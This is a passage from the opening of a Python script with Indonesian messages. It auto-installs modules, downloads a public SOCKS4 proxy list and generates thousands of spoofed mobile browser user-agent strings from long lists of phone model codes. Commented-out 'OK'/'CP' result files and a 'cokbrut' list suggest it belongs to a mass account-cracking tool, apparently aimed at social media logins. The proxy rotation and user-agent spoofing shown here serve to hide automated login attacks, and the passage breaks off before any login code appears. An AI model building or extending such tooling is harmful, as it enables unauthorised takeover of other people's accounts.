#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from time import time as mek
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as panel
from rich.panel import Panel as nel
from rich import print as cetak
from concurrent.futures import ThreadPoolExecutor as Rafmkz 
from rich.panel import Panel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.tree import Tree
from rich import print as rprint
from rich import print as prints
from rich import pretty
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.text import Text as tekz
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
#logika--tahun#

#sim_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
#sim_cp = f'CP-{hari}-{bulan}-{tahun}.txt'
#------------------[ USER-AGENT ]-------------------#
uman,usman1=[],[]
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
printcp=[]
oks=[]
cps=[]
redmi=[]
ugent=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mRAF-MKZ')
prox=open('.prox.txt','r').read().splitlines()
###----------[ GENERATE USERAGENT ]---------- ###
for xd in range(1000):
   rr = random.randint; rc = random.choice
   aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
   lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
   build_nokiax = ['JDQ39','JZO54K']
   oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
   redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
   realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020","RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
   infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
   samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ","G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B","S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]
   gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']  
   strvoppo = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
   strvredmi = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvoppo1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvinfinix = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; Infinix {str(rc(infinix))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvsamsung = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvredmi1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
   strvnokiax = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
   strvgt = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
   uateddy = random.choice([strvoppo, strvredmi,strvoppo1, strvinfinix, strvsamsung, strvredmi1, strvnokiax, strvgt])
   ugen.append(uateddy)
for ugenku in range(10000) :
	a=f'Viber/9.7.5.3'
	b=f'CFNetwork/976'
	c=f'Darwin/18.2.0'
	raff=f'{a} {b} {c}'
	ugen.append(raff) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	#d=random.randrange(1, 9) 
	e='PRO 7-S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='SLA-L02) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='SM-G935F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36 GSA/'+str(random.randrange(1, 100)) +'.'+str(random.randrange(10, 100))+'.'+str(random.randrange(1,100))+'.'+str(random.randrange(1, 100))+'.arm64'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(9, 15) 
	c='SAMSUNG SM-N960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/'
	d=random.randrange(10, 500) 
	e='0'
	f=random.randrange(10, 6000) 
	g=random.randrange(19, 500) 
	h='Mobile Safari/537.36'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='Redmi 4A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36 GSA/'+str(random.randrange(1, 100)) +'.'+str(random.randrange(10, 100))+'.'+str(random.randrange(1,100))+'.'+str(random.randrange(1, 100))+'.arm64'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='Tab2A7-10F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='Coolpad R108 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
